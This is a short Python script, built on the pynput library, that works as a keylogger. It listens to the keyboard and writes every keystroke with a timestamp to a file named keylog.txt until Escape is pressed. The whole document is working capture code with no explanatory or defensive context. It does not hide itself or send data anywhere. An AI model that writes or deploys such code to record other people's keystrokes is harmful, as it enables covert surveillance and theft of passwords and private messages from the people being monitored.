from pynput import keyboard
import logging

# Setup logging to capture the keystrokes
log_directory = ""  # Set this to a specific directory if desired
logging.basicConfig(filename=(log_directory + "keylog.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"{key}")

def on_release(key):
    # Stop listener if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()